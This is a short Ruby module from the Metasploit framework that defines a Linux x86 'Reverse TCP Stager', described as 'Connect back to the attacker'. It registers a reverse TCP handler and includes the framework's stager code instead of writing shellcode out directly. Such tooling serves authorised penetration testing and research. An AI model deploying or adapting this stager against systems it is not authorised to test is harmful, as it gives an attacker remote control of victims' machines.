##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/linux/reverse_tcp'

module Metasploit4

  CachedSize = 193

  include Msf::Payload::Stager
  include Msf::Payload::Linux::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect back to the attacker',
      'Author'      => [ 'skape', 'egypt' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => { 'Payload' => '' }))
  end

end
